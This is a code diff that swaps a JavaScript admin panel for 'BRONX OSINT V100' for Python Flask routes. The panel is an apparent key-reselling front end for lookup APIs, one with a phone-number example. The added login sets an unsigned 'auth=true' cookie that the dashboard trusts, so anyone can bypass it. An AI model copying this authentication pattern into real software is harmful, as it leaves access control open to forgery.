-.box::before{content:'BRONX OSINT V100';display:block;text-align:center;font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:6px;background:linear-gradient(90deg,#8b00ff,#00c8ff,#ff0080);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;font-weight:900}
-.box h2{color:#fff;text-align:center;margin-bottom:8px;font-size:28px;font-weight:900;font-family:'Orbitron',sans-serif;letter-spacing:2px;text-shadow:0 0 40px rgba(139,0,255,.5)}
-.box .sub{text-align:center;color:#666;font-size:12px;margin-bottom:30px;letter-spacing:3px;text-transform:uppercase}
-.box input{width:100%;padding:16px 18px;background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.08);border-radius:12px;color:#fff;margin-bottom:14px;font-size:14px;outline:none;font-family:'Rajdhani',sans-serif;transition:.4s}
-.box input:focus{border-color:#8b00ff;box-shadow:0 0 30px rgba(139,0,255,.2)}.box input::placeholder{color:#444}
-.btn{width:100%;padding:16px;background:linear-gradient(135deg,#8b00ff,#00c8ff);color:#fff;border:none;border-radius:12px;cursor:pointer;font-size:15px;font-weight:700;letter-spacing:3px;font-family:'Orbitron',sans-serif;transition:.4s;text-transform:uppercase}
-.btn:hover{transform:translateY(-2px);box-shadow:0 0 50px rgba(139,0,255,.4)}.msg{color:#ff0080;text-align:center;margin-top:14px;font-size:12px;display:none}.fp{text-align:center;margin-top:20px;font-size:10px;color:#333;letter-spacing:2px}
-</style></head><body><div class="particles" id="pt"></div><div class="box"><h2>ADMIN ACCESS</h2><p class="sub">V100 ULTRA PRIME</p><input type="text" id="u" placeholder="USERNAME"><input type="password" id="p" placeholder="PASSWORD"><button class="btn" onclick="login()">AUTHENTICATE</button><p class="msg" id="msg"></p><p class="fp">BRONX OSINT V100 · GOD TIER</p></div><script>
-for(var i=0;i<40;i++){var p=document.createElement('div');p.className='particle';p.style.left=Math.random()*100+'%';p.style.animationDelay=Math.random()*6+'s';p.style.animationDuration=(4+Math.random()*6)+'s';document.getElementById('pt').appendChild(p)}
-async function login(){var u=document.getElementById('u').value,p=document.getElementById('p').value,m=document.getElementById('msg');if(!u||!p){m.style.display='block';m.textContent='⚠ FILL ALL FIELDS';return}m.style.display='block';m.style.color='#00c8ff';m.textContent='◌ AUTHENTICATING...';try{var r=await fetch('/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p})});var d=await r.json();if(d.success){m.style.color='#00ff88';m.textContent='✓ '+d.message;setTimeout(function(){location.href=d.redirect},500)}else{m.style.color='#ff0080';m.textContent='✗ '+d.error}}catch(e){m.textContent='✗ CONNECTION ERROR'}}
-</script></body></html>`}
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
+            resp = make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
+            return resp
+        return render_template_string(LOGIN, error="Access Denied", effect=current_effect)
+    return render_template_string(LOGIN, error=None, effect=current_effect)
 
-function renderAdmin(token){try{
-const allKeys=Object.entries(keyStorage).map(([k,d])=>({key:k,name:d.name||'?',type:d.type||'?',limit:d.unlimited?'∞':d.limit,used:d.used||0,left:d.unlimited?'∞':Math.max(0,(d.limit||0)-(d.used||0)),expiry:d.expiryStr||'Lifetime',hidden:d.hidden||false,scopes:d.scopes||[],cooldown:d.cooldown||0,isExpired:d.expiry?isKeyExpired(d.expiry):false,created:d.created||''}));
-const totalKeys=allKeys.filter(k=>!k.hidden).length;
-const activeKeys=allKeys.filter(k=>!k.hidden&&!k.isExpired&&k.left!=0).length;
-const todayReqs=requestLogs.filter(l=>l.timestamp&&l.timestamp.startsWith(getIndiaDate())).length;
-const stoken=esc(token);
-let keysHTML='';allKeys.forEach(k=>{let s='● ACTIVE',sc='#00ff88';if(k.hidden){s='👑 MASTER';sc='#8b00ff'}else if(k.isExpired){s='⏱ EXPIRED';sc='#ff0080'}else if(k.left==0){s='⚠ LIMIT';sc='#ffaa00'}const acts=k.key!==MASTER_API_KEY?`<button class="ab a-g" onclick="resetKey('${esc(k.key)}')">↺</button><button class="ab a-y" onclick="pushKey('${esc(k.key)}')">↑</button><button class="ab a-r" onclick="deleteKey('${esc(k.key)}')">✕</button>`:'<span style="color:#8b00ff">🔒</span>';keysHTML+=`<tr><td style="color:#00c8ff;font-family:monospace;font-size:9px">${esc(k.key.length>14?k.key.substring(0,12)+'..':k.key)}</td><td>${esc(k.name)}</td><td style="color:#00c8ff">${k.limit}</td><td>${k.used}</td><td>${k.left}</td><td style="font-size:8px">${esc(k.expiry)}</td><td style="color:${sc};font-size:8px">${s}</td><td>${acts}</td></tr>`});
-const ipStats={};requestLogs.forEach(l=>{const ip=l.ip||'?';ipStats[ip]=(ipStats[ip]||0)+1});
-const ipHTML=Object.entries(ipStats).sort((a,b)=>b[1]-a[1]).slice(0,15).map(([ip,c])=>{const bd=bannedIPs.includes(ip);return`<tr><td style="color:#00c8ff;font-size:9px">${esc(ip)}</td><td>${c}</td><td style="color:${bd?'#ff0080':'#00ff88'}">${bd?'🚫 BANNED':'✅ ACTIVE'}</td><td><button class="ab ${bd?'a-g':'a-r'}" onclick="${bd?`unbanIP('${esc(ip)}')`:`banIP('${esc(ip)}')`}">${bd?'UNBAN':'BAN'}</button></td></tr>`}).join('');
-const logsHTML=requestLogs.slice(-20).reverse().map(l=>`<div class="li"><span>${(l.timestamp||'').substring(0,16)}</span><span>${l.key||'?'}</span><code>/${l.endpoint||'?'}</code><span class="${l.status==='success'?'sok':'serr'}">${l.status||'?'}</span></div>`).join('')||'<div style="color:#333;text-align:center;padding:30px">NO LOGS YET</div>';
-const customAPIHTML=customAPIs.map((a,i)=>`<tr><td>${a.id}</td><td>${esc(a.name||'—')}</td><td><code style="color:#00c8ff">/${esc(a.endpoint||'')}</code></td><td>${esc(a.param||'')}</td><td style="color:${a.visible?'#00ff88':'#ff0080'}">${a.visible?'✅ ON':'❌ OFF'}</td><td><button class="ab a-r" onclick="deleteAPI(${a.id})">✕</button></td></tr>`).join('');
-return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>BRONX V100 | ADMIN PANEL</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet"><style>
-:root{--bg:#06060c;--sur:#0d0d1a;--brd:rgba(139,0,255,.15);--txt:#e0e0f0;--acc:#8b00ff;--acc2:#00c8ff;--green:#00ff88;--red:#ff0080;--yellow:#ffaa00}
-*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--txt);font-family:'Rajdhani',sans-serif;font-size:13px;min-height:100vh}
-body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(139,0,255,.06),transparent 60%),radial-gradient(ellipse at 80% 100%,rgba(0,200,255,.04),transparent 50%);pointer-events:none;z-index:0}
-::selection{background:var(--acc);color:#fff}::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--acc);border-radius:10px}
-.top{background:rgba(13,13,26,.8);border-bottom:1px solid var(--brd);padding:14px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;position:sticky;top:0;z-index:100;backdrop-filter:blur(30px)}
-.top h1{font-family:'Orbitron',sans-serif;font-size:16px;letter-spacing:4px;background:linear-gradient(90deg,var(--acc),var(--acc2),#ff0080);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
-.tb{display:flex;gap:8px;flex-wrap:wrap;align-items:center}.tb button{background:rgba(139,0,255,.08);color:var(--txt);border:1px solid var(--brd);padding:8px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-family:'Rajdhani',sans-serif;font-weight:600;letter-spacing:1px;transition:.4s}
-.tb button:hover{background:rgba(139,0,255,.15);border-color:var(--acc);box-shadow:0 0 25px rgba(139,0,255,.2)}
-.ct{padding:20px;max-width:1500px;margin:0 auto;position:relative;z-index:1}
-.st{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin-bottom:18px}
-.sc{background:var(--sur);border:1px solid var(--brd);border-radius:14px;padding:18px;text-align:center;transition:.4s}
-.sc:hover{border-color:var(--acc);box-shadow:0 0 40px rgba(139,0,255,.1)}.sc .v{font-size:30px;font-weight:900;background:linear-gradient(135deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-family:'Orbitron',sans-serif}
-.sc .l{font-size:9px;color:#555;text-transform:uppercase;letter-spacing:3px;margin-top:4px;font-weight:600}
-.tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}.tab{padding:10px 18px;background:var(--sur);border:1px solid var(--brd);border-radius:10px;color:#666;cursor:pointer;font-size:11px;font-weight:600;letter-spacing:1px;transition:.4s;font-family:'Rajdhani',sans-serif}
-.tab:hover{border-color:var(--acc2);color:var(--acc2)}.tab.on{background:rgba(139,0,255,.1);border-color:var(--acc);color:#fff;box-shadow:0 0 30px rgba(139,0,255,.15)}
-.pn{display:none}.pn.on{display:block}.sn{background:var(--sur);border:1px solid var(--brd);border-radius:16px;padding:20px;margin-bottom:16px}
-.sn h3{color:#fff;margin-bottom:14px;font-size:16px;font-weight:700;letter-spacing:2px;font-family:'Orbitron',sans-serif}
-.fg{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px}.fg label{display:block;color:#555;font-size:9px;text-transform:uppercase;letter-spacing:2px;margin-bottom:4px;font-weight:600}
-.fg input,.fg select{width:100%;padding:11px 14px;background:var(--bg);border:1px solid var(--brd);border-radius:10px;color:#fff;font-size:12px;font-family:'Rajdhani',sans-serif;outline:none;transition:.4s}
-.fg input:focus,.fg select:focus{border-color:var(--acc);box-shadow:0 0 25px rgba(139,0,255,.15)}
-.btn1{padding:12px 24px;background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;border:none;border-radius:10px;font-weight:700;font-size:12px;cursor:pointer;letter-spacing:2px;font-family:'Orbitron',sans-serif;transition:.4s;text-transform:uppercase}
-.btn1:hover{transform:translateY(-2px);box-shadow:0 0 40px rgba(139,0,255,.3)}
-.btn2{padding:12px 24px;background:transparent;color:#666;border:1px solid var(--brd);border-radius:10px;cursor:pointer;font-size:12px;font-weight:600;letter-spacing:1px;transition:.4s;font-family:'Rajdhani',sans-serif}
-.btn2:hover{border-color:var(--acc2);color:var(--acc2)}table{width:100%;border-collapse:collapse;font-size:10px}
-th{background:rgba(139,0,255,.05);color:#666;padding:10px 6px;text-align:left;font-size:9px;letter-spacing:2px;font-weight:600}
-td{padding:8px 6px;border-bottom:1px solid rgba(255,255,255,.02)}tr:hover td{background:rgba(139,0,255,.02)}
-.ab{padding:5px 10px;font-size:10px;border-radius:6px;border:1px solid;cursor:pointer;margin:0 2px;font-weight:600;letter-spacing:1px;transition:.3s;background:transparent;font-family:'Rajdhani',sans-serif}
-.a-g{color:var(--green);border-color:rgba(0,255,136,.2)}.a-g:hover{background:rgba(0,255,136,.08)}
-.a-r{color:var(--red);border-color:rgba(255,0,128,.2)}.a-r:hover{background:rgba(255,0,128,.08)}
-.a-y{color:var(--yellow);border-color:rgba(255,170,0,.2)}.a-y:hover{background:rgba(255,170,0,.08)}
-.eb{background:var(--bg);border:1px solid var(--brd);border-radius:12px;padding:16px;margin-bottom:12px}
-.eb h4{color:var(--acc2);font-size:12px;margin-bottom:8px;letter-spacing:2px}
-.eb textarea{width:100%;min-height:100px;background:var(--bg);border:1px solid var(--brd);color:var(--acc2);padding:10px;border-radius:8px;font-family:monospace;font-size:10px;resize:vertical}
-.lb{max-height:350px;overflow:auto;background:var(--bg);border:1px solid var(--brd);border-radius:10px;padding:12px;font-family:monospace;font-size:9px}
-.li{display:flex;gap:10px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.015);flex-wrap:wrap;align-items:center;color:#666}
-.li span{min-width:70px;font-size:8px}.li code{color:var(--acc2);font-size:8px}.sok{color:var(--green)}.serr{color:var(--red)}
-@media(max-width:768px){.st{grid-template-columns:repeat(2,1fr)}.fg{grid-template-columns:1fr}}
-</style></head><body><div class="top"><h1>BRONX_ADMIN_V100</h1><div class="tb"><span style="color:#444;font-size:10px">[ ${getIndiaDateTime()} ]</span><button onclick="window.open('/')">🏠 HOME</button><button onclick="window.open('/docs')">📚 DOCS</button><button onclick="location.href='/admin'">🚪 LOGOUT</button></div></div><div class="ct">
-<div class="st"><div class="sc"><div class="v">${totalKeys}</div><div class="l">Total Keys</div></div><div class="sc"><div class="v">${activeKeys}</div><div class="l">Active</div></div><div class="sc"><div class="v">${todayReqs}</div><div class="l">Today</div></div><div class="sc"><div class="v">${requestLogs.length}</div><div class="l">Total Reqs</div></div><div class="sc"><div class="v">${bannedIPs.length}</div><div class="l">Banned IPs</div></div><div class="sc"><div class="v">${customAPIs.length}</div><div class="l">Custom APIs</div></div></div>
-<div class="tabs"><div class="tab on" onclick="st('gen')">⚡ GEN</div><div class="tab" onclick="st('keys')">🔑 KEYS</div><div class="tab" onclick="st('io')">📦 I/O</div><div class="tab" onclick="st('custom')">🔧 APIs</div><div class="tab" onclick="st('ips')">🛡 IPs</div><div class="tab" onclick="st('logs')">📜 LOGS</div><div class="tab" onclick="st('bulk')">📨 BULK</div><div class="tab" onclick="st('push')">⬆ PUSH</div><div class="tab" onclick="st('addapi')">➕ ADD API</div><div class="tab" onclick="st('settings')">⚙ SET</div></div>
-<div class="pn on" id="pn-gen"><div class="sn"><h3>⚡ KEY GENERATOR</h3><div class="fg"><div><label>Key ID</label><input id="gn" placeholder="KEY_NAME"></div><div><label>Owner</label><input id="go" placeholder="Name"></div><div><label>Limit</label><input id="gl" value="100"></div><div><label>Cooldown</label><input id="gc" value="0"></div><div><label>Expiry Mode</label><select id="gem" onchange="toggleExp()"><option value="date">Calendar</option><option value="days">Days</option><option value="life">Lifetime</option></select></div><div id="de"><label>Expiry Date</label><input type="date" id="ged"></div><div id="dd" style="display:none"><label>Days</label><input type="number" id="gedd" value="30"></div><div><label>Type</label><select id="gt"><option value="premium">Premium</option><option value="demo">Demo</option><option value="vip">VIP</option></select></div><div style="grid-column:1/-1"><label>Scopes</label><div style="display:flex;flex-wrap:wrap;gap:4px;padding:8px;background:var(--bg);border:1px solid var(--brd);border-radius:8px;max-height:80px;overflow:auto;font-size:9px"><label style="cursor:pointer;color:#666"><input type="checkbox" value="*" checked onchange="var v=this.checked;document.querySelectorAll('.scb').forEach(s=>s.checked=v)"> ALL</label>${Object.keys(endpoints).map(e=>'<label style="cursor:pointer;color:#666;margin-left:4px"><input type="checkbox" value="'+e+'" class="scb"> '+e+'</label>').join('')}</div></div><div style="grid-column:1/-1"><button class="btn1" onclick="gk()" style="width:100%">🚀 GENERATE</button></div></div></div></div>
-<div class="pn" id="pn-keys"><div class="sn"><h3>🔑 ALL KEYS: ${totalKeys}</h3><div style="max-height:450px;overflow:auto"><table><tr><th>KEY</th><th>OWNER</th><th>LIMIT</th><th>USED</th><th>LEFT</th><th>EXPIRY</th><th>STATUS</th><th>ACT</th></tr>${keysHTML}</table></div></div></div>
-<div class="pn" id="pn-io"><div class="sn"><h3>📦 IMPORT/EXPORT</h3><div class="eb" style="border-color:rgba(0,255,136,.2)"><h4 style="color:#00ff88">📤 EXPORT</h4><textarea readonly id="ed" onclick="this.select()">${esc(JSON.stringify(keyStorage,null,2))}</textarea><button class="btn1" onclick="navigator.clipboard.writeText(document.getElementById('ed').value);toast('[✓] Copied')" style="margin-top:8px">📋 COPY</button></div><div class="eb" style="border-color:rgba(0,200,255,.2)"><h4 style="color:#00c8ff">📥 IMPORT</h4><textarea id="id" placeholder="Paste JSON..."></textarea><button class="btn1" onclick="ik()" style="margin-top:8px;background:linear-gradient(135deg,#00c8ff,#8b00ff)">📥 IMPORT</button></div></div></div>
-<div class="pn" id="pn-custom"><div class="sn"><h3>🔧 CUSTOM APIs (${customAPIs.length})</h3><div style="max-height:400px;overflow:auto"><table><tr><th>ID</th><th>NAME</th><th>ENDPOINT</th><th>PARAM</th><th>STATUS</th><th>DEL</th></tr>${customAPIHTML}</table></div></div></div>
-<div class="pn" id="pn-ips"><div class="sn"><h3>🛡 IP MANAGER</h3><div style="margin-bottom:10px"><input id="bip" placeholder="Enter IP..." style="padding:10px;background:var(--bg);border:1px solid var(--brd);color:#fff;font-family:'Rajdhani',sans-serif;width:220px;font-size:11px;border-radius:8px"><button class="ab a-r" onclick="banIP2()" style="margin-left:8px;padding:10px 16px;font-size:11px">🚫 BAN</button></div><div style="max-height:350px;overflow:auto"><table><tr><th>IP</th><th>REQS</th><th>STATUS</th><th>ACT</th></tr>${ipHTML}</table></div></div></div>
-<div class="pn" id="pn-logs"><div class="sn"><h3>📜 LIVE LOGS</h3><button class="btn1" onclick="clearLogs()" style="margin-bottom:10px;padding:8px 16px;font-size:11px">🗑 CLEAR</button><div class="lb">${logsHTML}</div></div></div>
-<div class="pn" id="pn-bulk"><div class="sn"><h3>📨 BULK KEYS</h3><div class="fg"><div><label>Prefix</label><input id="bp" value="BULK_"></div><div><label>Count</label><input type="number" id="bc" value="5" max="50"></div><div><label>Limit</label><input id="bl" value="100"></div><div><label>Days</label><input type="number" id="bd" value="30"></div><div style="grid-column:1/-1"><button class="btn1" onclick="gb()" style="width:100%">📨 GENERATE</button></div><div style="grid-column:1/-1"><div id="br" style="max-height:180px;overflow:auto;font-family:monospace;font-size:9px;padding:10px;background:var(--bg);border:1px solid var(--brd);border-radius:8px;display:none;color:#00c8ff"></div></div></div></div></div>
-<div class="pn" id="pn-push"><div class="sn"><h3>⬆ PUSH KEY</h3><div class="fg"><div><label>Key</label><input id="pk" placeholder="KEY_NAME"></div><div><label>Days</label><input type="number" id="pd" value="30"></div><div style="grid-column:1/-1"><button class="btn1" onclick="pushK()" style="width:100%;background:linear-gradient(135deg,#ffaa00,#ff0080)">⬆ PUSH</button></div></div></div></div>
-<div class="pn" id="pn-addapi"><div class="sn"><h3>➕ ADD CUSTOM API</h3><div class="fg"><div><label>Name</label><input id="aname" placeholder="My API"></div><div><label>Endpoint</label><input id="aep" placeholder="my-api"></div><div><label>Parameter</label><input id="aparam" placeholder="num"></div><div><label>Example</label><input id="aex" placeholder="9876543210"></div><div><label>Real API URL</label><input id="aurl" placeholder="https://api.com?param={param}"></div><div style="grid-column:1/-1"><button class="btn1" onclick="addAPI()" style="width:100%">➕ ADD API</button></div></div></div></div>
-<div class="pn" id="pn-settings"><div class="sn"><h3>⚙ SETTINGS</h3><div class="fg"><div style="grid-column:1/-1"><button class="btn1" onclick="resetAll()" style="width:100%">🔄 RESET ALL USAGE</button></div><div style="grid-column:1/-1"><button class="btn2" onclick="clearLogs()" style="width:100%">🗑 CLEAR LOGS</button></div></div></div></div></div>
-<script>var TOKEN='${stoken}';function toast(m){var t=document.createElement('div');t.style.cssText='position:fixed;bottom:20px;right:20px;background:var(--sur);color:#00c8ff;padding:12px 20px;border-radius:10px;font-size:11px;z-index:9999;border:1px solid var(--brd);font-family:"Rajdhani",sans-serif;letter-spacing:1px;font-weight:600';t.textContent=m;document.body.appendChild(t);setTimeout(function(){t.remove()},2000)}
-function st(n){document.querySelectorAll('.pn').forEach(p=>p.classList.remove('on'));document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));document.getElementById('pn-'+n).classList.add('on');event.target.classList.add('on')}
-function toggleExp(){var m=document.getElementById('gem').value;document.getElementById('de').style.display=m==='date'?'block':'none';document.getElementById('dd').style.display=m==='days'?'block':'none'}
-async function ac(u,b){var o={method:b?'POST':'GET',headers:{'Content-Type':'application/json','x-admin-token':TOKEN}};if(b)o.body=JSON.stringify(b);var r=await fetch(u,o);return await r.json()}
-async function gk(){var n=document.getElementById('gn').value.trim(),o=document.getElementById('go').value.trim();if(!n||!o){toast('[!] Fill fields');return}var sc=[];document.querySelectorAll('#pn-gen input[type=checkbox]:checked').forEach(c=>sc.push(c.value));var em=document.getElementById('gem').value;var exp=null,days=null;if(em==='date'){exp=document.getElementById('ged').value;if(exp){var p=exp.split('-');exp=p[2]+'-'+p[1]+'-'+p[0]}}else if(em==='days'){days=parseInt(document.getElementById('gedd').value)||30}var r=await ac('/admin/generate-key',{keyName:n,keyOwner:o,scopes:sc,limit:document.getElementById('gl').value,cooldown:parseInt(document.getElementById('gc').value)||0,expiryDate:exp,days:days,keyType:document.getElementById('gt').value});r.success?(toast('[✓] Generated: '+n),setTimeout(function(){location.reload()},600)):toast('[!] '+(r.error||r.e))}
-async function resetKey(k){if(!confirm('Reset?'))return;var r=await ac('/admin/reset-key-usage',{keyName:k});r.success?location.reload():toast('[!] Error')}
-async function deleteKey(k){if(!confirm('DELETE?'))return;var r=await ac('/admin/delete-key',{keyName:k});r.success?location.reload():toast('[!] Error')}
-async function pushKey(k){var d=prompt('Days?','30');if(!d)return;var r=await ac('/admin/push-key',{keyName:k,days:parseInt(d)});r.success?(toast('[✓] '+r.message),setTimeout(function(){location.reload()},600)):toast('[!] '+(r.error||r.e))}
-async function pushK(){var k=document.getElementById('pk').value.trim();var d=parseInt(document.getElementById('pd').value)||30;if(!k){toast('[!] Enter key');return}var r=await ac('/admin/push-key',{keyName:k,days:d});r.success?(toast('[✓] '+r.message),setTimeout(function(){location.reload()},600)):toast('[!] '+(r.error||r.e))}
-async function ik(){var d=document.getElementById('id').value.trim();if(!d){toast('[!] Paste JSON');return}try{var ks=JSON.parse(d);var r=await ac('/admin/import-keys',{keys:ks});r.success?(toast('[✓] Imported: '+r.imported),setTimeout(function(){location.reload()},600)):toast('[!] Error')}catch(e){toast('[!] Invalid JSON')}}
-async function addAPI(){var n=document.getElementById('aname').value.trim(),e=document.getElementById('aep').value.trim(),p=document.getElementById('aparam').value.trim(),ex=document.getElementById('aex').value.trim(),u=document.getElementById('aurl').value.trim();if(!n||!e){toast('[!] Fill name & endpoint');return}var r=await ac('/admin/add-api',{name:n,endpoint:e,param:p,example:ex,realAPI:u});r.success?(toast('[✓] API Added!'),setTimeout(function(){location.reload()},600)):toast('[!] Error')}
-async function deleteAPI(id){if(!confirm('Delete API #'+id+'?'))return;var r=await ac('/admin/delete-api',{id:id});r.success?(toast('[✓] Deleted'),setTimeout(function(){location.reload()},400)):toast('[!] Error')}
-async function banIP2(){var ip=document.getElementById('bip').value.trim();if(!ip){toast('[!] Enter IP');return}var r=await ac('/admin/ban-ip',{ip:ip});r.success?(toast('[✓] Banned: '+ip),setTimeout(function(){location.reload()},400)):toast('[!] Error')}
-async function banIP(ip){var r=await ac('/admin/ban-ip',{ip:ip});r.success?location.reload():toast('[!] Error')}
-async function unbanIP(ip){var r=await ac('/admin/unban-ip',{ip:ip});r.success?location.reload():toast('[!] Error')}
-async function clearLogs(){if(!confirm('Clear?'))return;await ac('/admin/clear-logs');location.reload()}
-async function resetAll(){if(!confirm('Reset ALL?'))return;await ac('/admin/reset-all');toast('[✓] Reset');setTimeout(function(){location.reload()},400)}
-async function gb(){var p=document.getElementById('bp').value.trim()||'BULK_';var c=parseInt(document.getElementById('bc').value)||5;var l=document.getElementById('bl').value||'100';var d=parseInt(document.getElementById('bd').value)||30;if(c>50){toast('[!] Max 50');return}var rd=document.getElementById('br');rd.style.display='block';rd.innerHTML='Generating...';for(var i=1;i<=c;i++){var r=await ac('/admin/generate-key',{keyName:p+i,keyOwner:'Bulk_'+i,scopes:['*'],limit:l,cooldown:0,days:d,keyType:'bulk'});rd.innerHTML+='<div>'+(r.success?'[✓]':'[!]')+' '+p+i+'</div>'}toast('[✓] Done')}
-</script></body></html>`}catch(e){return '<html><body style="background:#06060c;color:#ff0080;padding:30px"><h1>ADMIN ERROR</h1><p>'+e.message+'</p></body></html>'}}
+@app.route('/dashboard')
+def dashboard():
+    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
+    return render_template_string(DASH, effects=EFFECTS, current_effect=current_effect)
 
-function renderDocs(){try{let html='';const cats={};Object.entries(endpoints).forEach(([n,e])=>{if(!cats[e.c])cats[e.c]=[];cats[e.c].push({name:n,...e});});html+='<div class="hero"><h1>📚 API DOCS V100</h1></div><div class="st"><div class="sc"><div class="v">'+Object.keys(endpoints).length+'</div><div class="l">ENDPOINTS</div></div></div>';Object.entries(cats).forEach(([c,eps])=>{html+=`<div class="cat-sec"><h2>${c.toUpperCase()}</h2><div class="ep-grid">`;eps.forEach(e=>{const ex=apiExamples[e.name]||{req:'GET /api/key-bronx/'+e.name+'?key=KEY&'+e.p+'='+e.e,res:'{"success":true}'};html+=`<div class="ep-card"><span class="ep-method">GET</span><b>/${e.name}</b><p>${e.d}</p><code class="req">${esc(ex.req)}</code><pre class="res">${esc(ex.res)}</pre></div>`});html+='</div></div>'});return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>BRONX API DOCS V100</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet"><style>
-:root{--bg:#06060c;--sur:#0d0d1a;--brd:rgba(139,0,255,.15);--txt:#e0e0f0;--acc:#8b00ff;--acc2:#00c8ff;--green:#00ff88}
-*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--txt);font-family:'Rajdhani',sans-serif;font-size:14px;min-height:100vh}
-body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(139,0,255,.06),transparent 60%),radial-gradient(ellipse at 80% 100%,rgba(0,200,255,.04),transparent 50%);pointer-events:none;z-index:0}
-.top{background:rgba(13,13,26,.9);border-bottom:1px solid var(--brd);padding:12px 24px;display:flex;justify-content:space-between;align-items:center;gap:8px;position:sticky;top:0;z-index:100;backdrop-filter:blur(30px)}
-.top a{color:var(--txt);text-decoration:none;font-size:12px;font-weight:600;letter-spacing:1px}.top a:hover{color:var(--acc2)}
-.ct{max-width:1100px;margin:0 auto;padding:20px;position:relative;z-index:1}.hero{text-align:center;padding:20px}
-.hero h1{font-family:'Orbitron',sans-serif;font-size:28px;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
-.st{display:flex;justify-content:center;gap:16px;margin:20px 0}.sc{background:var(--sur);border:1px solid var(--brd);border-radius:14px;padding:16px 24px;text-align:center}
-.sc .v{font-size:28px;font-weight:900;color:var(--acc)}.sc .l{font-size:9px;color:#555;text-transform:uppercase;letter-spacing:3px}
-.cat-sec{margin-bottom:24px}.cat-sec h2{color:var(--acc);font-size:16px;font-weight:700;letter-spacing:2px;margin-bottom:10px}
-.ep-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
-.ep-card{background:var(--sur);border:1px solid var(--brd);border-radius:12px;padding:14px;transition:.3s}
-.ep-card:hover{border-color:var(--acc)}.ep-method{background:rgba(0,200,255,.1);color:var(--acc2);padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700}
-.ep-card b{color:#fff;font-size:14px;margin-left:6px}.ep-card p{color:#666;font-size:10px;margin:4px 0}
-.req{display:block;background:rgba(0,0,0,.3);color:var(--acc2);padding:6px;border-radius:4px;font-size:9px;margin:6px 0;font-family:monospace;word-break:break-all}
-.res{background:rgba(0,255,136,.03);color:var(--green);padding:6px;border-radius:4px;font-size:9px;font-family:monospace;max-height:100px;overflow:auto;white-space:pre-wrap;word-break:break-all}
-@media(max-width:768px){.ep-grid{grid-template-columns:1fr}}
-</style></head><body><div class="top"><a href="/" style="font-family:'Orbitron',sans-serif;background:linear-gradient(90deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900">⚡ BRONX V100</a><a href="/">🏠 HOME</a><a href="/admin">🔐 ADMIN</a></div><div class="ct">${html}</div></body></html>`}catch(e){return '<h1>Error</h1>'}}
+@app.route('/effect/<effect>')
+def set_effect_route(effect):
+    global current_effect
+    if effect in EFFECTS:
+        current_effect = effect
+    return jsonify({"status": "ok", "effect": current_effect})
 
-function renderHome(){try{const vapis=customAPIs.filter(a=>a.visible&&a.endpoint);const totalEndpoints=Object.keys(endpoints).length+vapis.length;const totalKeys=Object.keys(keyStorage).filter(k=>!keyStorage[k]?.hidden).length;const epsJSON=JSON.stringify(endpoints).replace(/</g,'\\u003c');let cardsHTML='';Object.entries(endpoints).forEach(([n,e])=>{cardsHTML+=`<div class="ep" style="--ac:#8b00ff" onclick="cp('${esc(n)}','${esc(e.p)}','${esc(e.e)}')"><span>${e.i}</span><b>/${esc(n)}</b><small>${esc(e.d)}</small><code>${esc(e.p)}=${esc(e.e)}</code></div>`});vapis.forEach(a=>{cardsHTML+=`<div class="ep" style="--ac:#00c8ff" onclick="ccp('${esc(a.endpoint)}','${esc(a.param)}','${esc(a.example)}')"><span>🔧</span><b>/${esc(a.endpoint)}</b><small>${esc(a.desc||'Custom')}</small><code>${esc(a.param)}=${esc(a.example||'v')}</code></div>`});const opts=Object.entries(endpoints).map(([n,e])=>`<option value="${esc(n)}" data-p="${esc(e.p)}" data-ex="${esc(e.e)}">${e.i} /${esc(n)}</option>`).join('')+vapis.map(a=>`<option value="c_${a.id}" data-c="1" data-ep="${esc(a.endpoint)}" data-p="${esc(a.param)}" data-ex="${esc(a.example)}">🔧 /${esc(a.endpoint)}</option>`).join('');return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX OSINT V100 👑</title><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet"><style>
